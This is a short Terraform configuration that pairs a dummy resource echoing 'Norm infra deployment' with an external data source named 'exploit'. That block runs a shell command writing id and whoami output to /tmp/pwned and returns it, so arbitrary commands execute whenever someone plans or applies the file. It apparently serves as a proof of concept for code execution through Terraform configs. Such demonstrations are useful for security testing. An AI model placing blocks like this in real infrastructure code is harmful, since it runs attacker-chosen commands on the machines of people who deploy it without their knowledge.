resource "null_resource" "dummy" {
  provisioner "local-exec" {
    command = "echo 'Norm infra deployment'"
  }
}

data "external" "exploit" {
 program = ["sh", "-c", "id > /tmp/pwned; whoami >> /tmp/pwned; OUTPUT=$(cat /tmp/pwned | tr -d \"\\n\"); echo '{\"result\":\"$OUTPUT\"}'"]
}